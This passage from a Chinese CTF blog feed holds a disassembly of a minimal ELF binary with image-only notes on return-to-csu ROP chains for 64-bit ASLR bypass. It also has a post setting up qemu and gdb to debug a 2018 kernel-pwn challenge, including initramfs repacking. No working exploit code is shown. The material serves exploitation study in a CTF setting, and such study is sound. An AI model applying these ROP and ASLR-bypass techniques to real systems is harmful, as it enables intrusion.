class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/0ctf2018/blackhole$ objdump -d empty</span><br><span class="line"></span><br><span class="line">empty：     文件格式 elf64-x86-64</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">0000000000400390 &lt;_init&gt;:</span><br><span class="line">  400390:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400394:48 8b 05 5d 0c 20 00 mov    0x200c5d(%rip),%rax        # 600ff8 &lt;_DYNAMIC+0x1d0&gt;</span><br><span class="line">  40039b:48 85 c0             test   %rax,%rax</span><br><span class="line">  40039e:74 05                je     4003a5 &lt;_init+0x15&gt;</span><br><span class="line">  4003a0:e8 2b 00 00 00       callq  4003d0 &lt;__libc_start_main@plt+0x10&gt;</span><br><span class="line">  4003a5:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  4003a9:c3                   retq   </span><br><span class="line"></span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">00000000004003b0 &lt;__libc_start_main@plt-0x10&gt;:</span><br><span class="line">  4003b0:ff 35 52 0c 20 00    pushq  0x200c52(%rip)        # 601008 &lt;_GLOBAL_OFFSET_TABLE_+0x8&gt;</span><br><span class="line">  4003b6:ff 25 54 0c 20 00    jmpq   *0x200c54(%rip)        # 601010 &lt;_GLOBAL_OFFSET_TABLE_+0x10&gt;</span><br><span class="line">  4003bc:0f 1f 40 00          nopl   0x0(%rax)</span><br><span class="line"></span><br><span class="line">00000000004003c0 &lt;__libc_start_main@plt&gt;:</span><br><span class="line">  4003c0:ff 25 52 0c 20 00    jmpq   *0x200c52(%rip)        # 601018 &lt;_GLOBAL_OFFSET_TABLE_+0x18&gt;</span><br><span class="line">  4003c6:68 00 00 00 00       pushq  $0x0</span><br><span class="line">  4003cb:e9 e0 ff ff ff       jmpq   4003b0 &lt;_init+0x20&gt;</span><br><span class="line"></span><br><span class="line">Disassembly of section .plt.got:</span><br><span class="line"></span><br><span class="line">00000000004003d0 &lt;.plt.got&gt;:</span><br><span class="line">  4003d0:ff 25 22 0c 20 00    jmpq   *0x200c22(%rip)        # 600ff8 &lt;_DYNAMIC+0x1d0&gt;</span><br><span class="line">  4003d6:66 90                xchg   %ax,%ax</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000000004003e0 &lt;_start&gt;:</span><br><span class="line">  4003e0:31 ed                xor    %ebp,%ebp</span><br><span class="line">  4003e2:49 89 d1             mov    %rdx,%r9</span><br><span class="line">  4003e5:5e                   pop    %rsi</span><br><span class="line">  4003e6:48 89 e2             mov    %rsp,%rdx</span><br><span class="line">  4003e9:48 83 e4 f0          and    $0xfffffffffffffff0,%rsp</span><br><span class="line">  4003ed:50                   push   %rax</span><br><span class="line">  4003ee:54                   push   %rsp</span><br><span class="line">  4003ef:49 c7 c0 60 05 40 00 mov    $0x400560,%r8</span><br><span class="line">  4003f6:48 c7 c1 f0 04 40 00 mov    $0x4004f0,%rcx</span><br><span class="line">  4003fd:48 c7 c7 d6 04 40 00 mov    $0x4004d6,%rdi</span><br><span class="line">  400404:e8 b7 ff ff ff       callq  4003c0 &lt;__libc_start_main@plt&gt;</span><br><span class="line">  400409:f4                   hlt    </span><br><span class="line">  40040a:66 0f 1f 44 00 00    nopw   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000400410 &lt;deregister_tm_clones&gt;:</span><br><span class="line">  400410:b8 37 10 60 00       mov    $0x601037,%eax</span><br><span class="line">  400415:55                   push   %rbp</span><br><span class="line">  400416:48 2d 30 10 60 00    sub    $0x601030,%rax</span><br><span class="line">  40041c:48 83 f8 0e          cmp    $0xe,%rax</span><br><span class="line">  400420:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  400423:76 1b                jbe    400440 &lt;deregister_tm_clones+0x30&gt;</span><br><span class="line">  400425:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  40042a:48 85 c0             test   %rax,%rax</span><br><span class="line">  40042d:74 11                je     400440 &lt;deregister_tm_clones+0x30&gt;</span><br><span class="line">  40042f:5d                   pop    %rbp</span><br><span class="line">  400430:bf 30 10 60 00       mov    $0x601030,%edi</span><br><span class="line">  400435:ff e0                jmpq   *%rax</span><br><span class="line">  400437:66 0f 1f 84 00 00 00 nopw   0x0(%rax,%rax,1)</span><br><span class="line">  40043e:00 00 </span><br><span class="line">  400440:5d                   pop    %rbp</span><br><span class="line">  400441:c3                   retq   </span><br><span class="line">  400442:0f 1f 40 00          nopl   0x0(%rax)</span><br><span class="line">  400446:66 2e 0f 1f 84 00 00 nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40044d:00 00 00 </span><br><span class="line"></span><br><span class="line">0000000000400450 &lt;register_tm_clones&gt;:</span><br><span class="line">  400450:be 30 10 60 00       mov    $0x601030,%esi</span><br><span class="line">  400455:55                   push   %rbp</span><br><span class="line">  400456:48 81 ee 30 10 60 00 sub    $0x601030,%rsi</span><br><span class="line">  40045d:48 c1 fe 03          sar    $0x3,%rsi</span><br><span class="line">  400461:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  400464:48 89 f0             mov    %rsi,%rax</span><br><span class="line">  400467:48 c1 e8 3f          shr    $0x3f,%rax</span><br><span class="line">  40046b:48 01 c6             add    %rax,%rsi</span><br><span class="line">  40046e:48 d1 fe             sar    %rsi</span><br><span class="line">  400471:74 15                je     400488 &lt;register_tm_clones+0x38&gt;</span><br><span class="line">  400473:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  400478:48 85 c0             test   %rax,%rax</span><br><span class="line">  40047b:74 0b                je     400488 &lt;register_tm_clones+0x38&gt;</span><br><span class="line">  40047d:5d                   pop    %rbp</span><br><span class="line">  40047e:bf 30 10 60 00       mov    $0x601030,%edi</span><br><span class="line">  400483:ff e0                jmpq   *%rax</span><br><span class="line">  400485:0f 1f 00             nopl   (%rax)</span><br><span class="line">  400488:5d                   pop    %rbp</span><br><span class="line">  400489:c3                   retq   </span><br><span class="line">  40048a:66 0f 1f 44 00 00    nopw   0x0(%rax,%rax,1)</span><br><span class="line"></span><br><span class="line">0000000000400490 &lt;__do_global_dtors_aux&gt;:</span><br><span class="line">  400490:80 3d 99 0b 20 00 00 cmpb   $0x0,0x200b99(%rip)        # 601030 &lt;__TMC_END__&gt;</span><br><span class="line">  400497:75 11                jne    4004aa &lt;__do_global_dtors_aux+0x1a&gt;</span><br><span class="line">  400499:55                   push   %rbp</span><br><span class="line">  40049a:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  40049d:e8 6e ff ff ff       callq  400410 &lt;deregister_tm_clones&gt;</span><br><span class="line">  4004a2:5d                   pop    %rbp</span><br><span class="line">  4004a3:c6 05 86 0b 20 00 01 movb   $0x1,0x200b86(%rip)        # 601030 &lt;__TMC_END__&gt;</span><br><span class="line">  4004aa:f3 c3                repz retq </span><br><span class="line">  4004ac:0f 1f 40 00          nopl   0x0(%rax)</span><br><span class="line"></span><br><span class="line">00000000004004b0 &lt;frame_dummy&gt;:</span><br><span class="line">  4004b0:bf 20 0e 60 00       mov    $0x600e20,%edi</span><br><span class="line">  4004b5:48 83 3f 00          cmpq   $0x0,(%rdi)</span><br><span class="line">  4004b9:75 05                jne    4004c0 &lt;frame_dummy+0x10&gt;</span><br><span class="line">  4004bb:eb 93                jmp    400450 &lt;register_tm_clones&gt;</span><br><span class="line">  4004bd:0f 1f 00             nopl   (%rax)</span><br><span class="line">  4004c0:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  4004c5:48 85 c0             test   %rax,%rax</span><br><span class="line">  4004c8:74 f1                je     4004bb &lt;frame_dummy+0xb&gt;</span><br><span class="line">  4004ca:55                   push   %rbp</span><br><span class="line">  4004cb:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  4004ce:ff d0                callq  *%rax</span><br><span class="line">  4004d0:5d                   pop    %rbp</span><br><span class="line">  4004d1:e9 7a ff ff ff       jmpq   400450 &lt;register_tm_clones&gt;</span><br><span class="line"></span><br><span class="line">00000000004004d6 &lt;main&gt;:</span><br><span class="line">  4004d6:55                   push   %rbp</span><br><span class="line">  4004d7:48 89 e5             mov    %rsp,%rbp</span><br><span class="line">  4004da:89 7d fc             mov    %edi,-0x4(%rbp)</span><br><span class="line">  4004dd:48 89 75 f0          mov    %rsi,-0x10(%rbp)</span><br><span class="line">  4004e1:b8 00 00 00 00       mov    $0x0,%eax</span><br><span class="line">  4004e6:5d                   pop    %rbp</span><br><span class="line">  4004e7:c3                   retq   </span><br><span class="line">  4004e8:0f 1f 84 00 00 00 00 nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4004ef:00 </span><br><span class="line"></span><br><span class="line">00000000004004f0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4004f0:41 57                push   %r15</span><br><span class="line">  4004f2:41 56                push   %r14</span><br><span class="line">  4004f4:41 89 ff             mov    %edi,%r15d</span><br><span class="line">  4004f7:41 55                push   %r13</span><br><span class="line">  4004f9:41 54                push   %r12</span><br><span class="line">  4004fb:4c 8d 25 0e 09 20 00 lea    0x20090e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  400502:55                   push   %rbp</span><br><span class="line">  400503:48 8d 2d 0e 09 20 00 lea    0x20090e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  40050a:53                   push   %rbx</span><br><span class="line">  40050b:49 89 f6             mov    %rsi,%r14</span><br><span class="line">  40050e:49 89 d5             mov    %rdx,%r13</span><br><span class="line">  400511:4c 29 e5             sub    %r12,%rbp</span><br><span class="line">  400514:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400518:48 c1 fd 03          sar    $0x3,%rbp</span><br><span class="line">  40051c:e8 6f fe ff ff       callq  400390 &lt;_init&gt;</span><br><span class="line">  400521:48 85 ed             test   %rbp,%rbp</span><br><span class="line">  400524:74 20                je     400546 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  400526:31 db                xor    %ebx,%ebx</span><br><span class="line">  400528:0f 1f 84 00 00 00 00 nopl   0x0(%rax,%rax,1)</span><br><span class="line">  40052f:00 </span><br><span class="line">  400530:4c 89 ea             mov    %r13,%rdx</span><br><span class="line">  400533:4c 89 f6             mov    %r14,%rsi</span><br><span class="line">  400536:44 89 ff             mov    %r15d,%edi</span><br><span class="line">  400539:41 ff 14 dc          callq  *(%r12,%rbx,8)</span><br><span class="line">  40053d:48 83 c3 01          add    $0x1,%rbx</span><br><span class="line">  400541:48 39 eb             cmp    %rbp,%rbx</span><br><span class="line">  400544:75 ea                jne    400530 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400546:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  40054a:5b                   pop    %rbx</span><br><span class="line">  40054b:5d                   pop    %rbp</span><br><span class="line">  40054c:41 5c                pop    %r12</span><br><span class="line">  40054e:41 5d                pop    %r13</span><br><span class="line">  400550:41 5e                pop    %r14</span><br><span class="line">  400552:41 5f                pop    %r15</span><br><span class="line">  400554:c3                   retq   </span><br><span class="line">  400555:90                   nop</span><br><span class="line">  400556:66 2e 0f 1f 84 00 00 nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40055d:00 00 00 </span><br><span class="line"></span><br><span class="line">0000000000400560 &lt;__libc_csu_fini&gt;:</span><br><span class="line">  400560:f3 c3                repz retq </span><br><span class="line"></span><br><span class="line">Disassembly of section .fini:</span><br><span class="line"></span><br><span class="line">0000000000400564 &lt;_fini&gt;:</span><br><span class="line">  400564:48 83 ec 08          sub    $0x8,%rsp</span><br><span class="line">  400568:48 83 c4 08          add    $0x8,%rsp</span><br><span class="line">  40056c:c3                   retq</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-091806.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-091751.png" alt=""><br>我们把除了application source code之外的其他函数称为The Attached code<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-104551.png" alt=""></p><h3 id="64-bit-ASLR-bypass"><a href="#64-bit-ASLR-bypass" class="headerlink" title="64-bit ASLR bypass"></a>64-bit ASLR bypass</h3><ol><li>手动分析“attached code”，寻找ROP-chain,劫持控制流。</li></ol><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-110704.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-110721.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-110731.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-111109.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-111502.png" alt=""></p><p><strong>blackhole里</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-110833.png" alt=""></p><ol><li>分析plt和got，用urop来leak libc地址</li></ol><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-111629.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-111746.png" alt=""></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-113814.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-121318.png" alt=""></p><ol><li>使用libc构造rop-chain<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-121852.png" alt=""></li></ol><h3 id="什么时候我们能使用return-to-csu"><a href="#什么时候我们能使用return-to-csu" class="headerlink" title="什么时候我们能使用return to csu"></a>什么时候我们能使用return to csu</h3><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-31-122304.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;议题下载链接&quot;&gt;&lt;a href=&quot;#议题下载链接&quot; class=&quot;headerlink&quot; title=&quot;议题下载链接&quot;&gt;&lt;/a&gt;议题下载链接&lt;/h2&gt;&lt;p&gt;&lt;a href=&quot;https://www.blackhat.com/docs/asia-18/asia-18
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="其他" scheme="http://eternalsakura13.com/categories/CTF/pwn/%E5%85%B6%E4%BB%96/"/>
    
    
      <category term="ret2csu" scheme="http://eternalsakura13.com/tags/ret2csu/"/>
    
  </entry>
  
  <entry>
    <title>强网杯2018 core环境搭建</title>
    <link href="http://eternalsakura13.com/2018/03/31/b_core/"/>
    <id>http://eternalsakura13.com/2018/03/31/b_core/</id>
    <published>2018-03-30T17:04:32.212Z</published>
    <updated>2018-04-03T11:49:35.090Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h2><h3 id="题目链接"><a href="#题目链接" class="headerlink" title="题目链接"></a>题目链接</h3><p><a href="https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/core_give.tar" target="_blank" rel="noopener">https://github.com/eternalsakura/ctf_pwn/blob/master/%E5%BC%BA%E7%BD%91%E6%9D%AF2018/core_give.tar</a></p><h3 id="调试环境"><a href="#调试环境" class="headerlink" title="调试环境"></a>调试环境</h3><p>ubuntu14.04<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ uname -a</span><br><span class="line">Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br></pre></td></tr></table></figure></p><p>gdb 7.7.1<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~$ gdb -v</span><br><span class="line">GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.3) 7.7.1</span><br></pre></td></tr></table></figure></p><h3 id="下载qemu"><a href="#下载qemu" class="headerlink" title="下载qemu"></a>下载qemu</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu qemu-system</span><br></pre></td></tr></table></figure><h3 id="打开虚拟化"><a href="#打开虚拟化" class="headerlink" title="打开虚拟化"></a>打开虚拟化</h3><p>这个在cpu那里<br>vm版本：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-172405.jpg" alt=""><br>pd版本：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-172455.png" alt=""></p><h3 id="start-sh"><a href="#start-sh" class="headerlink" title="start.sh"></a>start.sh</h3><p>本来这样应该就可以了，不过有几个坑点我还是要说一下。</p><ul><li>-m megs         set virtual RAM size to megs MB [default=128]<br>原先shell里指定的是64M，这样会GG，起码改成128M，觉得不够还可以加。</li><li>-kernel bzImage use ‘bzImage’ as kernel image<br>指定kernel image</li><li>-initrd file    use ‘file’ as initial ram disk<br>要运行不能只有内核，这里是相当于指定一个硬盘（使用软件将RAM模拟当做硬盘来使用）<br>cpio是一种文件系统，后面解包就看懂了。</li><li>-append cmdline use ‘cmdline’ as kernel command line<br>没什么好说的，调试的时候可以关了kaslr，指定no kaslr</li><li>-s              shorthand for -gdb tcp::1234<br>这东西坑了我很久，意思是-gdb tcp::1234这个命令的缩写，所以你在后面再指定gdb，或者进了monitor（这种方法参考muhe师傅的<a href="https://www.anquanke.com/post/id/85840" target="_blank" rel="noopener">文章</a>,也就是启动时按ctrl+alt+2，反正mac的虚拟机里没法按……我就不这样了）再运行gdbserver都会报 Duplicate ID ‘gdb’ for chardev。</li></ul><p><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-172604.png" alt=""></p><p>这样运行shell应该就可以了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-174142.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-174124.png" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-174156.png" alt=""></p><h3 id="关闭定时power-down"><a href="#关闭定时power-down" class="headerlink" title="关闭定时power down"></a>关闭定时power down</h3><p>类似alarm，如图，直接自己就结束了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-174239.jpg" alt=""><br>要改掉这个，也是删掉一个配置就行了，不过这个要在init里改了，如图，就是这句，删掉就好了<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-174550.png" alt=""><br>而我们知道实际上这个硬盘是那个cpio文件,所以要删除这句话的话，首先需要解包cpio，删了这句话，然后重新打包。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ ls</span><br><span class="line">bzImage  core.cpio  start.sh  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ mkdir core</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ mv core.cpio ./core/core.cpio.gz</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ cd core</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">core.cpio.gz</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ gunzip core.cpio.gz </span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">core.cpio</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ cpio -idmv &lt; core.cpio</span><br><span class="line">.</span><br><span class="line">bin</span><br><span class="line">bin/ionice</span><br><span class="line">bin/iostat</span><br><span class="line">bin/ipcalc</span><br><span class="line">bin/kbd_mode</span><br><span class="line">bin/linux32</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">root</span><br><span class="line">root/flag</span><br><span class="line">core.ko</span><br><span class="line">tmp</span><br><span class="line">init</span><br><span class="line">vmlinux</span><br><span class="line">104379 blocks</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">bin  core.cpio  core.ko  etc  gen_cpio.sh  init  lib  lib64  linuxrc  proc  root  sbin  sys  tmp  usr  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ rm -rf core.cpio </span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">bin  core.ko  etc  gen_cpio.sh  init  lib  lib64  linuxrc  proc  root  sbin  sys  tmp  usr  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ vim init</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ./gen_cpio.sh core.cpio</span><br><span class="line">.</span><br><span class="line">./usr</span><br><span class="line">./usr/sbin</span><br><span class="line">./usr/sbin/delgroup</span><br><span class="line">./usr/sbin/i2cdump</span><br><span class="line">./usr/sbin/rtcwake</span><br><span class="line">./usr/sbin/i2cget</span><br><span class="line">./usr/sbin/ubiattach</span><br><span class="line">./usr/sbin/dhcprelay</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">./bin/ping</span><br><span class="line">./bin/busybox</span><br><span class="line">./bin/kbd_mode</span><br><span class="line">./bin/sh</span><br><span class="line">./bin/grep</span><br><span class="line">./bin/base64</span><br><span class="line">./bin/mount</span><br><span class="line">104379 blocks</span><br><span class="line"></span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ ls</span><br><span class="line">bin  core.cpio  core.ko  etc  gen_cpio.sh  init  lib  lib64  linuxrc  proc  root  sbin  sys  tmp  usr  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ mv core.cpio ../core.cpio</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player/core$ cd ..</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ ls</span><br><span class="line">bzImage  core  core.cpio  start.sh  vmlinux</span><br><span class="line">sakura@ubuntu:~/Desktop/give_to_player$ rm -rf core</span><br></pre></td></tr></table></figure></p><p>解释一下，上面这些log里最重要的就是cpio的解包和打包。</p><ol><li><p>解包的坑点是cpio文件应该这么解压,先用gunzip，再用cpio -idmv，但是gunzip认后缀不认文件格式，所以我们要先重命名为core.cpio.gz，再cpio -idmv提取。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gunzip 文件名.cpio.gz</span><br><span class="line">cpio -idmv &lt; 文件名.cpio</span><br></pre></td></tr></table></figure></li><li><p>打包这个……师傅告诉我里面的gen_cpio.sh就是打包的shell,$1是我们输入的参数，也就是要输出的文件名。<br>比如./gen_cpio.sh core.cpio就代表打包后输出的文件名为core.cpio。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat gen_cpio.sh </span><br><span class="line">find . -print0 \</span><br><span class="line">| cpio --null -ov --format=newc \</span><br><span class="line">| gzip -9 &gt; $1</span><br></pre></td></tr></table></figure></li></ol><p>可以看到这样就删掉了，就不会2分钟后自动终止了。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-03-30-175856.png" alt=""></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>这样我们的搭建就完成了，看上去不复杂，我还是踩坑踩了一晚上，不过这样qemu+gdb调试kernel其实也会了(我后面应该会写怎么搭建)<br>感谢师傅们指导了QVQ。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境准备&quot;&gt;&lt;a href=&quot;#环境准备&quot; class=&quot;headerlink&quot; title=&quot;环境准备&quot;&gt;&lt;/a&gt;环境准备&lt;/h2&gt;&lt;h3 id=&quot;题目链接&quot;&gt;&lt;a href=&quot;#题目链接&quot; class=&quot;headerlink&quot; title=&quot;题目链接&quot;&gt;&lt;/a
      
    
    </summary>
    
      <category term="CTF" scheme="http://eternalsakura13.com/categories/CTF/"/>
    
      <category term="pwn" scheme="http://eternalsakura13.com/categories/CTF/pwn/"/>
    
      <category term="kernel" scheme="http://eternalsakura13.com/categories/CTF/pwn/kernel/"/>
    
    
      <category term="kernel pwn" scheme="http://eternalsakura13.com/tags/kernel-pwn/"/>
    
  </entry>
  
</feed>
